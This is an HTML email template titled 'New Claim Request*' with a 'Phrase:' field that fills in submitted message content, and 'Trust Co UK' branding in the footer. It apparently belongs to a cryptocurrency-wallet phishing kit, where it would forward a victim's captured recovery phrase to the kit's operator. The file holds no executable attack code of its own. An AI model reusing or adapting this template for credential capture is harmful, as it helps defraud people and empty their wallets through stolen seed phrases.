<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Template</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            color: #333;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        .email-container {
            width: 100%;
            max-width: 600px;
            margin: 20px auto;
            background-color: #0500ff;
            border-radius: 8px;
            padding: 20px;
        }
        .email-header {
            text-align: center;
            background-color: #48ff91;
            padding: 10px;
            color: #000;
            border-radius: 5px;
        }
        .email-header h2 {
            margin: 0;
            font-size: 18px;
        }
        .email-body {
            margin-top: 20px;
            font-size: 16px;
            color:#fff;
        }
        .email-body p {
            line-height: 1.5;
            font-size: 20px;
        }
        .email-footer {
            text-align: center;
            font-size: 10px;
            color: #ffffff6b;
            margin-top: 80px;
        }
    </style>
</head>
<body>
    <div class="email-container">
        <div class="email-header">
            <h2>New Claim Request*</h2>
        </div>
        <div class="email-body">
            <p><strong>Phrase:</strong></p>
            <p>{{message_content}}</p>
        </div>
        <div class="email-footer">
            <p>&copy; <?php echo date('Y'); ?> © 2024 Trust Co UK. All rights reserved.</p>
        </div>
    </div>
</body>
</html>
